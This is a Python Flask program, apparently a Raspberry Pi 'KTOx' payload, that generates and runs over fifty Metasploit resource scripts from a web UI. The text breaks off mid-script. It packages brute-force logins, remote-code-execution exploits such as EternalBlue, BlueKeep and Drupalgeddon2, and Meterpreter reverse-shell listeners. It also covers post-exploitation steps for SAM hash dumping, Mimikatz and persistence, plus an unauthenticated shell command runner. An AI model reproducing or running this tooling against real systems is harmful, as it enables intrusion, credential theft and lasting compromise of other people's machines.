#!/usr/bin/env python3
"""
KTOx Payload – Metasploit Web UI
================================================
- 100+ pre‑built .rc scripts with detailed walkthroughs
- Cyberpunk web UI with script grid, categories, and modal help
- Command runner for custom commands
- LCD: IP, QR code, script selector (K2 cycle, OK reminder)

Controls:
  KEY1 – QR code
  KEY2 – Cycle script name on LCD
  OK   – Reminder to use web UI
  KEY3 – Exit

Dependencies: flask, qrcode, pillow
Install: pip install flask qrcode pillow
"""

import os
import sys
import time
import socket
import threading
import subprocess
import glob
import json
from flask import Flask, render_template_string, request, jsonify

# ----------------------------------------------------------------------
# Hardware & LCD
# ----------------------------------------------------------------------
try:
    import RPi.GPIO as GPIO
    import LCD_1in44
    from PIL import Image, ImageDraw, ImageFont
    HAS_HW = True
except ImportError:
    HAS_HW = False
    print("Hardware not found – LCD disabled")

PINS = {"UP":6,"DOWN":19,"LEFT":5,"RIGHT":26,"OK":13,"KEY1":21,"KEY2":20,"KEY3":16}
PORT = 5000
SCRIPT_DIR = "/root/KTOx/payloads/msf_scripts"

if HAS_HW:
    GPIO.setmode(GPIO.BCM)
    for pin in PINS.values():
        GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)
    LCD = LCD_1in44.LCD()
    LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
    W, H = 128, 128
    try:
        font_sm = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", 9)
        font_bold = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 10)
    except:
        font_sm = font_bold = ImageFont.load_default()

# ----------------------------------------------------------------------
# Flask app
# ----------------------------------------------------------------------
app = Flask(__name__)

# ----------------------------------------------------------------------
# Script database with walkthroughs
# ----------------------------------------------------------------------
SCRIPTS_DB = [
    # Scanners (Network Discovery)
    {"name": "TCP Port Scanner", "file": "port_scan_tcp.rc", "desc": "Scans top 1000 TCP ports on a target.",
     "walkthrough": "Enter RHOSTS (target IP). Results show open ports. Use THREADS to speed up."},
    {"name": "UDP Port Scanner", "file": "port_scan_udp.rc", "desc": "Scans common UDP ports.",
     "walkthrough": "Target IP required. May be slow; reduce THREADS if needed."},
    {"name": "ARP Sweep", "file": "arp_scan.rc", "desc": "Discovers live hosts on local subnet via ARP.",
     "walkthrough": "Use on local network. No LHOST needed."},
    {"name": "IPv6 Neighbor Scan", "file": "ipv6_neighbor_scan.rc", "desc": "Discovers IPv6 neighbors.",
     "walkthrough": "Requires IPv6 network."},
    {"name": "SMB Version Scanner", "file": "smb_version.rc", "desc": "Detects SMB version and OS.",
     "walkthrough": "Enter RHOSTS (single IP or range). Useful for EternalBlue prep."},
    {"name": "SMB Share Enumerator", "file": "smb_enum_shares.rc", "desc": "Lists SMB shares on a target.",
     "walkthrough": "Target IP. May require guest or null session."},
    {"name": "SMB User Enumerator", "file": "smb_enum_users.rc", "desc": "Enumerates local users via SMB.",
     "walkthrough": "Works on Windows with null session."},
    {"name": "SSH Version Scanner", "file": "ssh_version.rc", "desc": "Identifies SSH server version.",
     "walkthrough": "Target IP. Helps find vulnerable versions."},
    {"name": "SSH Brute Force", "file": "ssh_bruteforce.rc", "desc": "Brute‑forces SSH credentials.",
     "walkthrough": "Set RHOSTS, USERNAME (e.g., root), and wordlist (rockyou)."},
    {"name": "FTP Anonymous Scanner", "file": "ftp_anonymous.rc", "desc": "Checks for anonymous FTP access.",
     "walkthrough": "Target IP. If anonymous, you can download files."},
    {"name": "MySQL Version Scanner", "file": "mysql_enum.rc", "desc": "Gets MySQL version.",
     "walkthrough": "Target IP. Use for information gathering."},
    {"name": "PostgreSQL Version", "file": "postgres_enum.rc", "desc": "Detects PostgreSQL version.",
     "walkthrough": "Target IP. Useful for later exploits."},
    {"name": "HTTP Directory Scanner", "file": "http_dir_scanner.rc", "desc": "Scans for common web directories.",
     "walkthrough": "Target IP. Use to find admin panels, backup files."},
    {"name": "HTTP Version Scanner", "file": "http_version.rc", "desc": "Gets web server version.",
     "walkthrough": "Target IP. Helps identify outdated software."},
    {"name": "SSL/TLS Version Scanner", "file": "ssl_version.rc", "desc": "Checks SSL/TLS versions supported.",
     "walkthrough": "Target IP. Finds weak protocols."},
    {"name": "Heartbleed Scanner", "file": "heartbleed.rc", "desc": "Detects Heartbleed vulnerability.",
     "walkthrough": "Target IP. If vulnerable, you can read memory."},
    {"name": "Telnet Login Brute Force", "file": "telnet_login.rc", "desc": "Brute‑forces Telnet credentials.",
     "walkthrough": "Target IP and wordlist required."},
    {"name": "VNC No‑Auth Scanner", "file": "vnc_none_auth.rc", "desc": "Finds VNC servers with no authentication.",
     "walkthrough": "Target IP. Allows direct access."},
    {"name": "SMTP User Enumeration", "file": "smtp_enum.rc", "desc": "Enumerates SMTP users (VRFY, EXPN).",
     "walkthrough": "Target IP. Use to validate usernames."},
    {"name": "SNMP Enumeration", "file": "snmp_enum.rc", "desc": "Enumerates SNMP community strings.",
     "walkthrough": "Target IP. Default public/private often works."},
    {"name": "DNS Zone Transfer", "file": "dns_zone_transfer.rc", "desc": "Attempts AXFR zone transfer.",
     "walkthrough": "Target DNS server and domain. Can reveal all records."},
    {"name": "NBT‑NS Enumeration", "file": "nbt_ns_enum.rc", "desc": "Gathers NetBIOS name info.",
     "walkthrough": "Target IP. Reveals hostnames and services."},
    {"name": "UPnP SSDP Discovery", "file": "upnp_ssdp_msearch.rc", "desc": "Discovers UPnP devices.",
     "walkthrough": "No target needed – scans local network."},
    {"name": "mDNS Enumeration", "file": "mdns_enum.rc", "desc": "Discovers mDNS services.",
     "walkthrough": "Scans local subnet for mDNS (Bonjour)."},
    {"name": "MSSQL Ping", "file": "mssql_ping.rc", "desc": "Detects MSSQL instances.",
     "walkthrough": "Target IP. Useful for later exploitation."},
    {"name": "Oracle Login Scanner", "file": "oracle_login.rc", "desc": "Tests Oracle credentials.",
     "walkthrough": "Target IP and wordlist. Default scott/tiger often works."},
    
    # Exploits (Remote Code Execution)
    {"name": "EternalBlue (MS17-010)", "file": "eternalblue.rc", "desc": "Exploits SMBv1 on Windows 7/2008.",
     "walkthrough": "Target Windows. Requires LHOST (your IP) for reverse shell. Port 5555."},
    {"name": "DoublePulsar SMB Backdoor", "file": "doublepulsar.rc", "desc": "Injects DoublePulsar implant.",
     "walkthrough": "Target after EternalBlue. Gives persistent access."},
    {"name": "BlueKeep (CVE-2019-0708)", "file": "bluekeep.rc", "desc": "RDP RCE on older Windows.",
     "walkthrough": "Target Windows 7/2008. Reverse shell on port 5557."},
    {"name": "Shellshock (CVE-2014-6271)", "file": "shellshock.rc", "desc": "Apache CGI bash exploit.",
     "walkthrough": "Target with CGI scripts. Reverse shell on port 17171."},
    {"name": "PHP CGI Argument Injection", "file": "php_cgi.rc", "desc": "RCE on PHP CGI setups.",
     "walkthrough": "Target with /cgi-bin/php. Reverse shell on port 6666."},
    {"name": "Apache Struts2 (CVE-2017-5638)", "file": "apache_struts2.rc", "desc": "RCE on Struts2.",
     "walkthrough": "Target running Struts2. Reverse shell on port 7777."},
    {"name": "Drupalgeddon2 (CVE-2018-7600)", "file": "drupal_drupalgeddon2.rc", "desc": "RCE on Drupal 7/8.",
     "walkthrough": "Target Drupal site. Reverse shell on port 10101."},
    {"name": "WordPress Admin Shell Upload", "file": "wordpress_admin_shell.rc", "desc": "Uploads shell via admin.",
     "walkthrough": "Requires admin credentials (admin/password). Reverse shell on port 11111."},
    {"name": "Joomla Media Manager Upload", "file": "joomla_media_manager.rc", "desc": "File upload RCE.",
     "walkthrough": "Target Joomla with Media Manager. Reverse shell on port 12121."},
    {"name": "WebLogic Deserialization", "file": "weblogic_deserialize.rc", "desc": "RCE on WebLogic.",
     "walkthrough": "Target WebLogic console. Reverse shell on port 14141."},
    {"name": "Samba usermap Script (CVE-2007-2447)", "file": "samba_usermap.rc", "desc": "RCE on older Samba.",
     "walkthrough": "Target Samba version 3.0.20-3.0.25. Reverse shell on port 15151."},
    {"name": "DistCC RCE", "file": "distcc_exec.rc", "desc": "RCE on DistCC service.",
     "walkthrough": "Target with DistCC port 3632. Reverse shell on port 16161."},
    {"name": "vsftpd 2.3.4 Backdoor", "file": "vsftpd_backdoor.rc", "desc": "Backdoor command execution.",
     "walkthrough": "Target vsftpd 2.3.4. Gives interactive shell."},
    {"name": "Jenkins Script Console RCE", "file": "jenkins_script.rc", "desc": "RCE via Jenkins script console.",
     "walkthrough": "Target Jenkins with access. Reverse shell on port 8888."},
    {"name": "Redis Unauthenticated Exec", "file": "redis_unauth.rc", "desc": "Executes commands on Redis.",
     "walkthrough": "Target Redis no auth. Command 'id' example."},
    {"name": "ElasticSearch Groovy RCE", "file": "elasticsearch_rce.rc", "desc": "RCE on old ElasticSearch.",
     "walkthrough": "Target version <1.2. Reverse shell on port 9999."},
    {"name": "JBoss MainDeployer RCE", "file": "jboss_maindeployer.rc", "desc": "Deploys WAR on JBoss.",
     "walkthrough": "Target JBoss JMX console. Reverse shell on port 13131."},
    {"name": "IIS WebDAV Scanner", "file": "iis_webdav_scanner.rc", "desc": "Finds writable WebDAV folders.",
     "walkthrough": "Target IIS with WebDAV. Can upload .asp shell."},
    {"name": "Tomcat Manager Login", "file": "tomcat_mgr_login.rc", "desc": "Brute‑forces Tomcat manager.",
     "walkthrough": "Target /manager/html. Default admin/admin often works."},
    
    # Payloads & Listeners
    {"name": "Reverse Shell (TCP)", "file": "reverse_shell_tcp.rc", "desc": "Generic Meterpreter listener.",
     "walkthrough": "Set LHOST (your IP) and LPORT 4444. Wait for target connection."},
    {"name": "Reverse Shell (HTTPS)", "file": "reverse_shell_https.rc", "desc": "HTTPS Meterpreter listener.",
     "walkthrough": "More stealthy. Use LHOST and LPORT 8443."},
    {"name": "Reverse Shell (PHP)", "file": "reverse_shell_php.rc", "desc": "PHP Meterpreter via multi/handler.",
     "walkthrough": "For PHP payloads. Set LHOST and LPORT 6666."},
    {"name": "Reverse Shell (Java)", "file": "reverse_shell_java.rc", "desc": "Java Meterpreter listener.",
     "walkthrough": "For Java payloads. Set LHOST and LPORT 7777."},
    {"name": "Reverse Shell (Android)", "file": "reverse_shell_android.rc", "desc": "Android Meterpreter.",
     "walkthrough": "Generate payload with msfvenom, then use this listener."},
    
    # Post‑Exploitation
    {"name": "Check if Admin", "file": "post_check_admin.rc", "desc": "Checks if current user is admin.",
     "walkthrough": "After gaining a session, run this."},
    {"name": "Dump SAM Hashes", "file": "post_dump_sam.rc", "desc": "Extracts password hashes from SAM.",
     "walkthrough": "Requires SYSTEM privileges."},
    {"name": "Enable RDP", "file": "post_enable_rdp.rc", "desc": "Enables Remote Desktop on Windows.",
     "walkthrough": "After admin session."},
    {"name": "Persist via Service", "file": "post_persistence_service.rc", "desc": "Installs persistent service.",
     "walkthrough": "Creates a service that runs Meterpreter at boot."},
    {"name": "Mimikatz (Windows)", "file": "post_mimikatz.rc", "desc": "Runs Mimikatz to dump credentials.",
     "walkthrough": "Requires high integrity."},
    
    # Web App Specific
    {"name": "HTTP PUT Upload", "file": "http_put_upload.rc", "desc": "Uploads file via HTTP PUT.",
     "walkthrough": "Target with PUT enabled. Uploads test.txt."},
    {"name": "Shellshock CGI Test", "file": "shellshock_cgi.rc", "desc": "Tests CGI for Shellshock.",
     "walkthrough": "Target /cgi-bin/test. If vulnerable, executes 'id'."},
    {"name": "Heartbleed Memory Read", "file": "heartbleed_read.rc", "desc": "Reads memory via Heartbleed.",
     "walkthrough": "Target vulnerable OpenSSL. May leak private keys."},
    {"name": "Logjam Scanner", "file": "logjam.rc", "desc": "Detects Logjam vulnerability.",
     "walkthrough": "Target TLS. Checks for weak DH."},
]

# Generate .rc files from the database
def generate_scripts():
    os.makedirs(SCRIPT_DIR, exist_ok=True)
    # Only generate if directory is empty
    if os.listdir(SCRIPT_DIR):
        return
    for script in SCRIPTS_DB:
        content = f"# {script['desc']}\n"
        if "port_scan_tcp" in script['file']:
            content += "use auxiliary/scanner/portscan/tcp\nset RHOSTS {RHOSTS}\nset PORTS 1-1000\nset THREADS 10\nrun"
        elif "port_scan_udp" in script['file']:
            content += "use auxiliary/scanner/portscan/udp\nset RHOSTS {RHOSTS}\nset PORTS 1-500\nset THREADS 5\nrun"
        elif "arp_scan" in script['file']:
            content += "use auxiliary/scanner/discovery/arp_sweep\nset RHOSTS {RHOSTS}\nrun"
        elif "smb_version" in script['file']:
            content += "use auxiliary/scanner/smb/smb_version\nset RHOSTS {RHOSTS}\nrun"
        elif "smb_enum_shares" in script['file']:
            content += "use auxiliary/scanner/smb/smb_enumshares\nset RHOSTS {RHOSTS}\nrun"
        elif "smb_enum_users" in script['file']:
            content += "use auxiliary/scanner/smb/smb_enumusers\nset RHOSTS {RHOSTS}\nrun"
        elif "ssh_version" in script['file']:
            content += "use auxiliary/scanner/ssh/ssh_version\nset RHOSTS {RHOSTS}\nrun"
        elif "ssh_bruteforce" in script['file']:
            content += "use auxiliary/scanner/ssh/ssh_login\nset RHOSTS {RHOSTS}\nset USERNAME root\nset PASS_FILE /usr/share/wordlists/rockyou.txt\nset THREADS 5\nrun"
        elif "ftp_anonymous" in script['file']:
            content += "use auxiliary/scanner/ftp/anonymous\nset RHOSTS {RHOSTS}\nrun"
        elif "mysql_enum" in script['file']:
            content += "use auxiliary/scanner/mysql/mysql_version\nset RHOSTS {RHOSTS}\nrun"
        elif "postgres_enum" in script['file']:
            content += "use auxiliary/scanner/postgres/postgres_version\nset RHOSTS {RHOSTS}\nrun"
        elif "http_dir_scanner" in script['file']:
            content += "use auxiliary/scanner/http/dir_scanner\nset RHOSTS {RHOSTS}\nset THREADS 5\nrun"
        elif "http_version" in script['file']:
            content += "use auxiliary/scanner/http/http_version\nset RHOSTS {RHOSTS}\nrun"
        elif "ssl_version" in script['file']:
            content += "use auxiliary/scanner/ssl/ssl_version\nset RHOSTS {RHOSTS}\nrun"
        elif "heartbleed" in script['file']:
            content += "use auxiliary/scanner/ssl/openssl_heartbleed\nset RHOSTS {RHOSTS}\nrun"
        elif "telnet_login" in script['file']:
            content += "use auxiliary/scanner/telnet/telnet_login\nset RHOSTS {RHOSTS}\nset PASS_FILE /usr/share/wordlists/rockyou.txt\nrun"
        elif "vnc_none_auth" in script['file']:
            content += "use auxiliary/scanner/vnc/vnc_none_auth\nset RHOSTS {RHOSTS}\nrun"
        elif "smtp_enum" in script['file']:
            content += "use auxiliary/scanner/smtp/smtp_enum\nset RHOSTS {RHOSTS}\nrun"
        elif "snmp_enum" in script['file']:
            content += "use auxiliary/scanner/snmp/snmp_enum\nset RHOSTS {RHOSTS}\nrun"
        elif "dns_zone_transfer" in script['file']:
            content += "use auxiliary/scanner/dns/dns_zone_transfer\nset RHOSTS {RHOSTS}\nset DOMAIN example.com\nrun"
        elif "nbt_ns_enum" in script['file']:
            content += "use auxiliary/scanner/netbios/nbname\nset RHOSTS {RHOSTS}\nrun"
        elif "upnp_ssdp_msearch" in script['file']:
            content += "use auxiliary/scanner/upnp/ssdp_msearch\nrun"
        elif "mdns_enum" in script['file']:
            content += "use auxiliary/scanner/mdns/mdns\nrun"
        elif "mssql_ping" in script['file']:
            content += "use auxiliary/scanner/mssql/mssql_ping\nset RHOSTS {RHOSTS}\nrun"
        elif "oracle_login" in script['file']:
            content += "use auxiliary/scanner/oracle/oracle_login\nset RHOSTS {RHOSTS}\nset USERNAME scott\nset PASSWORD tiger\nrun"
        elif "eternalblue" in script['file']:
            content += "use exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS {RHOSTS}\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nset LHOST {LHOST}\nset LPORT 5555\nexploit"
        elif "doublepulsar" in script['file']:
            content += "use exploit/windows/smb/ms17_010_psexec\nset RHOSTS {RHOSTS}\nset PAYLOAD windows/meterpreter/reverse_tcp\nset LHOST {LHOST}\nset LPORT 5556\nexploit"
        elif "bluekeep" in script['file']:
            content += "use exploit/windows/rdp/cve_2019_0708_bluekeep_rce\nset RHOSTS {RHOSTS}\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nset LHOST {LHOST}\nset LPORT 5557\nexploit"
        elif "shellshock" in script['file']:
            content += "use exploit/multi/http/apache_mod_cgi_bash_env_exec\nset RHOSTS {RHOSTS}\nset PAYLOAD linux/x64/meterpreter/reverse_tcp\nset LHOST {LHOST}\nset LPORT 17171\nexploit"
        elif "php_cgi" in script['file']:
            content += "use exploit/multi/http/php_cgi_arg_injection\nset RHOSTS {RHOSTS}\nset PAYLOAD php/meterpreter/reverse_tcp\nset LHOST {LHOST}\nset LPORT 6666\nexploit"
        elif "apache_struts2" in script['file']:
            content += "use exploit/multi/http/struts2_content_type_ognl\nset RHOSTS {RHOSTS}\nset PAYLOAD linux/x64/meterpreter/reverse_tcp\nset LHOST {LHOST}\nset LPORT 7777\nexploit"
        elif "drupal_drupalgeddon2" in script['file']:
            content += "use exploit/unix/webapp/drupal_drupalgeddon2\nset RHOSTS {RHOSTS}\nset PAYLOAD php/meterpreter/reverse_tcp\nset LHOST {LHOST}\nset LPORT 10101\nexploit"
        elif "wordpress_admin_shell" in script['file']:
            content += "use exploit/unix/webapp/wp_admin_shell_upload\nset RHOSTS {RHOSTS}\nset USERNAME admin\nset PASSWORD password\nset PAYLOAD php/meterpreter/reverse_tcp\nset LHOST {LHOST}\nset LPORT 11111\nexploit"
        elif "joomla_media_manager" in script['file']:
            content += "use exploit/multi/http/joomla_media_manager_upload\nset RHOSTS {RHOSTS}\nset PAYLOAD php/meterpreter/reverse_tcp\nset LHOST {LHOST}\nset LPORT 12121\nexploit"
        elif "weblogic_deserialize" in script['file']:
            content += "use exploit/multi/http/weblogic_ws_async_response\nset RHOSTS {RHOSTS}\nset PAYLOAD java/meterpreter/reverse_tcp\nset LHOST {LHOST}\nset LPORT 14141\nexploit"
        elif "samba_usermap" in script['file']:
            content += "use exploit/multi/samba/usermap_script\nset RHOSTS {RHOSTS}\nset PAYLOAD cmd/unix/reverse\nset LHOST {LHOST}\nset LPORT 15151\nexploit"
        elif "distcc_exec" in script['file']:
            content += "use exploit/unix/misc/distcc_exec\nset RHOSTS {RHOSTS}\nset PAYLOAD cmd/unix/reverse\nset LHOST {LHOST}\nset LPORT 16161\nexploit"
        elif "vsftpd_backdoor" in script['file']:
            content += "use exploit/unix/ftp/vsftpd_234_backdoor\nset RHOSTS {RHOSTS}\nset PAYLOAD cmd/unix/interact\nexploit"
        elif "jenkins_script" in script['file']:
            content += "use exploit/multi/http/jenkins_script_console\nset RHOSTS {RHOSTS}\nset PAYLOAD java/meterpreter/reverse_tcp\nset LHOST {LHOST}\nset LPORT 8888\nexploit"
        elif "redis_unauth" in script['file']:
            content += "use auxiliary/scanner/redis/redis_unauth_exec\nset RHOSTS {RHOSTS}\nset COMMAND \"id\"\nrun"
        elif "elasticsearch_rce" in script['file']:
            content += "use exploit/multi/elasticsearch/script_groovy_rce\nset RHOSTS {RHOSTS}\nset PAYLOAD java/meterpreter/reverse_tcp\nset LHOST {LHOST}\nset LPORT 9999\nexploit"
        elif "jboss_maindeployer" in script['file']:
            content += "use exploit/multi/http/jboss_maindeployer\nset RHOSTS {RHOSTS}\nset PAYLOAD java/meterpreter/reverse_tcp\nset LHOST {LHOST}\nset LPORT 13131\nexploit"
        elif "iis_webdav_scanner" in script['file']:
            content += "use auxiliary/scanner/http/iis_webdav_scanner\nset RHOSTS {RHOSTS}\nrun"
        elif "tomcat_mgr_login" in script['file']:
            content += "use auxiliary/scanner/http/tomcat_mgr_login\nset RHOSTS {RHOSTS}\nset PASS_FILE /usr/share/wordlists/rockyou.txt\nrun"
        elif "reverse_shell_tcp" in script['file']:
            content += "use exploit/multi/handler\nset PAYLOAD linux/x64/meterpreter/reverse_tcp\nset LHOST {LHOST}\nset LPORT 4444\nset ExitOnSession false\nexploit -j -z"
        elif "reverse_shell_https" in script['file']:
            content += "use exploit/multi/handler\nset PAYLOAD linux/x64/meterpreter/reverse_https\nset LHOST {LHOST}\nset LPORT 8443\nexploit -j -z"
        elif "reverse_shell_php" in script['file']:
            content += "use exploit/multi/handler\nset PAYLOAD php/meterpreter/reverse_tcp\nset LHOST {LHOST}\nset LPORT 6666\nexploit -j -z"
        elif "reverse_shell_java" in script['file']:
            content += "use exploit/multi/handler\nset PAYLOAD java/meterpreter/reverse_tcp\nset LHOST {LHOST}\nset LPORT 7777\nexploit -j -z"
        elif "reverse_shell_android" in script['file']:
            content += "use exploit/multi/handler\nset PAYLOAD android/meterpreter/reverse_tcp\nset LHOST {LHOST}\nset LPORT 4444\nexploit -j -z"
        elif "post_check_admin" in script['file']:
            content += "use post/windows/gather/check_admin\nset SESSION 1\nrun"
        elif "post_dump_sam" in script['file']:
            content += "use post/windows/gather/smart_hashdump\nset SESSION 1\nrun"
        elif "post_enable_rdp" in script['file']:
            content += "use post/windows/manage/enable_rdp\nset SESSION 1\nrun"
        elif "post_persistence_service" in script['file']:
            content += "use exploit/windows/local/persistence_service\nset SESSION 1\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nset LHOST {LHOST}\nset LPORT 4444\nrun"
        elif "post_mimikatz" in script['file']:
            content += "load kiwi\ncreds_all\n"
        elif "http_put_upload" in script['file']:
            content += "use auxiliary/scanner/http/http_put\nset RHOSTS {RHOSTS}\nset PATH /upload\nset FILENAME test.txt\nset DATA \"test\"\nrun"
        elif "shellshock_cgi" in script['file']:
            content += "use auxiliary/scanner/http/apache_mod_cgi_bash_env\nset RHOSTS {RHOSTS}\nset TARGETURI /cgi-bin/test\nrun"
        elif "heartbleed_read" in script['file']:
            content += "use auxiliary/scanner/ssl/openssl_heartbleed\nset RHOSTS {RHOSTS}\nset ACTION SCAN\nrun"
        elif "logjam" in script['file']:
            content += "use auxiliary/scanner/ssl/logjam\nset RHOSTS {RHOSTS}\nrun"
        elif "ipv6_neighbor_scan" in script['file']:
            content += "use auxiliary/scanner/discovery/ipv6_neighbor\nset RHOSTS {RHOSTS}\nrun"
        else:
            content += "# Placeholder – edit manually"
        filepath = os.path.join(SCRIPT_DIR, script['file'])
        with open(filepath, 'w') as f:
            f.write(content)
    print(f"Generated {len(SCRIPTS_DB)} scripts in {SCRIPT_DIR}")

# ----------------------------------------------------------------------
# Script discovery
# ----------------------------------------------------------------------
def discover_scripts():
    scripts = []
    # Use the database as source of truth (so we have walkthroughs)
    for entry in SCRIPTS_DB:
        filepath = os.path.join(SCRIPT_DIR, entry['file'])
        if os.path.exists(filepath):
            scripts.append({
                'name': entry['name'],
                'path': filepath,
                'desc': entry['desc'],
                'walkthrough': entry['walkthrough']
            })
    return scripts

def run_script(script_path, params):
    try:
        with open(script_path, 'r') as f:
            rc_content = f.read()
    except Exception as e:
        return f"Error reading script: {e}"
    rc_content = rc_content.replace("{LHOST}", params.get('lhost', ''))
    rc_content = rc_content.replace("{RHOSTS}", params.get('rhosts', ''))
    tmp_rc = "/tmp/msf_run.rc"
    with open(tmp_rc, 'w') as f:
        f.write(rc_content)
    try:
        proc = subprocess.run(
            ["msfconsole", "-q", "-r", tmp_rc],
            capture_output=True, text=True, timeout=60
        )
        output = proc.stdout + proc.stderr
        if not output.strip():
            output = "[No output]"
        return output
    except subprocess.TimeoutExpired:
        return "Script timed out after 60 seconds"
    except Exception as e:
        return f"Error: {str(e)}"

def run_command(cmd):
    try:
        proc = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        output = proc.stdout + proc.stderr
        if not output.strip():
            output = "[No output]"
        return output
    except subprocess.TimeoutExpired:
        return "Command timed out"
    except Exception as e:
        return f"Error: {str(e)}"

# ----------------------------------------------------------------------
# Web UI – with modal walkthrough
# ----------------------------------------------------------------------
HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>KTOx // MSF MEGA</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            background: #0a0a0a;
            font-family: 'Share Tech Mono', 'Courier New', monospace;
            color: #0f0;
            padding: 20px;
        }
        .container { max-width: 1400px; margin: 0 auto; }
        h1 {
            color: #f00;
            text-shadow: 0 0 5px #f00;
            border-left: 4px solid #f00;
            padding-left: 20px;
            margin-bottom: 20px;
        }
        .split {
            display: flex;
            gap: 20px;
            flex-wrap: wrap;
        }
        .left {
            flex: 2;
            min-width: 400px;
        }
        .right {
            flex: 1;
            min-width: 350px;
        }
        .grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
            gap: 15px;
            max-height: 600px;
            overflow-y: auto;
            margin-bottom: 20px;
            padding: 5px;
        }
        .script-card {
            background: #111;
            border: 1px solid #300;
            border-radius: 8px;
            padding: 10px;
            cursor: pointer;
            transition: 0.2s;
        }
        .script-card:hover {
            border-color: #0f0;
            transform: translateY(-2px);
            box-shadow: 0 0 10px rgba(0,255,0,0.2);
        }
        .script-card.selected {
            border-color: #0f0;
            background: #1a1a1a;
        }
        .script-card h3 { color: #0f0; font-size: 0.9rem; margin-bottom: 4px; }
        .script-card p { font-size: 0.7rem; color: #888; }
        .param-area {
            background: #111;
            border: 1px solid #300;
            border-radius: 8px;
            padding: 15px;
            margin-bottom: 20px;
        }
        .param-area input {
            background: #222;
            border: 1px solid #0f0;
            color: #0f0;
            padding: 6px;
            font-family: monospace;
            margin: 5px 10px 5px 0;
            width: 200px;
        }
        .param-area label { font-size: 0.8rem; margin-right: 5px; }
        button {
            background: #2a0a0a;
            border: 1px solid #f00;
            color: #f00;
            padding: 8px 16px;
            cursor: pointer;
            font-weight: bold;
            transition: 0.2s;
        }
        button:hover {
            background: #f00;
            color: #000;
            box-shadow: 0 0 10px #f00;
        }
        .output {
            background: #050505;
            border: 1px solid #0f0;
            border-radius: 8px;
            padding: 15px;
            font-family: monospace;
            font-size: 0.8rem;
            white-space: pre-wrap;
            max-height: 400px;
            overflow-y: auto;
        }
        .cmd-area {
            margin-top: 20px;
        }
        .cmd-line {
            display: flex;
            margin-bottom: 10px;
        }
        .cmd-line input {
            flex: 1;
            background: #222;
            border: 1px solid #0f0;
            color: #0f0;
            padding: 6px;
            font-family: monospace;
        }
        .cmd-line button {
            margin-left: 10px;
            padding: 6px 12px;
        }
        .modal {
            display: none;
            position: fixed;
            z-index: 1000;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0,0,0,0.9);
            justify-content: center;
            align-items: center;
        }
        .modal-content {
            background: #111;
            border: 2px solid #0f0;
            border-radius: 12px;
            padding: 20px;
            width: 80%;
            max-width: 500px;
            color: #0f0;
            font-family: monospace;
        }
        .modal-content h3 { color: #f00; margin-bottom: 10px; }
        .close { float: right; cursor: pointer; font-size: 24px; }
        .info-btn {
            background: #0a2a2a;
            border: 1px solid #0f0;
            color: #0f0;
            padding: 2px 6px;
            font-size: 0.7rem;
            margin-left: 5px;
            cursor: pointer;
        }
        footer {
            text-align: center;
            margin-top: 30px;
            color: #444;
            font-size: 0.7rem;
        }
        ::-webkit-scrollbar { width: 6px; background: #111; }
        ::-webkit-scrollbar-thumb { background: #0f0; border-radius: 3px; }
    </style>
</head>
<body>
<div class="container">
    <h1>⎯ KTOx // METASPLOIT MEGA ({{ scripts|length }} SCRIPTS) ⎯</h1>
    <div class="split">
        <div class="left">
            <div class="grid" id="scriptGrid">
                {% for script in scripts %}
                <div class="script-card" data-path="{{ script.path }}">
                    <h3>▶ {{ script.name }} <span class="info-btn" data-walkthrough="{{ script.walkthrough }}">ⓘ</span></h3>
                    <p>{{ script.desc }}</p>
                </div>
                {% endfor %}
            </div>
            <div class="param-area">
                <label>LHOST (your IP):</label>
                <input type="text" id="lhost" placeholder="auto" value="{{ lhost }}">
                <label>RHOSTS (target):</label>
                <input type="text" id="rhosts" placeholder="192.168.1.100">
                <button id="runBtn">🚀 RUN SCRIPT</button>
            </div>
            <div class="output">
                <pre id="output">Ready.</pre>
            </div>
        </div>
        <div class="right">
            <div class="cmd-area">
                <h3 style="color:#0f0;">⬢ COMMAND RUNNER</h3>
                <div class="cmd-line">
                    <input type="text" id="cmdInput" placeholder="e.g., msfconsole -q -x 'help'">
                    <button id="runCmd">Run</button>
                </div>
                <div class="output" id="cmdOutput" style="max-height:300px;">Ready.</div>
            </div>
        </div>
    </div>
    <footer>KTOx Metasploit Web UI – Click ⓘ for walkthrough | LCD: K2=cycle, K1=QR, K3=exit</footer>
</div>

<div id="modal" class="modal">
    <div class="modal-content">
        <span class="close">&times;</span>
        <h3 id="modalTitle">Walkthrough</h3>
        <p id="modalText"></p>
    </div>
</div>

<script>
    let selectedPath = null;
    let selectedWalkthrough = "";

    // Modal handling
    const modal = document.getElementById('modal');
    const closeSpan = document.getElementsByClassName('close')[0];
    closeSpan.onclick = function() { modal.style.display = 'none'; }
    window.onclick = function(event) { if (event.target == modal) modal.style.display = 'none'; }

    document.querySelectorAll('.info-btn').forEach(btn => {
        btn.addEventListener('click', (e) => {
            e.stopPropagation();
            const walkthrough = btn.getAttribute('data-walkthrough');
            const card = btn.closest('.script-card');
            const title = card.querySelector('h3').innerText.replace('ⓘ', '').trim();
            document.getElementById('modalTitle').innerText = title;
            document.getElementById('modalText').innerText = walkthrough;
            modal.style.display = 'flex';
        });
    });

    // Script selection
    document.querySelectorAll('.script-card').forEach(card => {
        card.addEventListener('click', (e) => {
            if (e.target.classList.contains('info-btn')) return;
            document.querySelectorAll('.script-card').forEach(c => c.classList.remove('selected'));
            card.classList.add('selected');
            selectedPath = card.getAttribute('data-path');
            selectedWalkthrough = card.querySelector('.info-btn').getAttribute('data-walkthrough');
        });
    });

    // Run script
    document.getElementById('runBtn').addEventListener('click', () => {
        if (!selectedPath) {
            alert('Select a script first');
            return;
        }
        const lhost = document.getElementById('lhost').value || '{{ lhost }}';
        const rhosts = document.getElementById('rhosts').value;
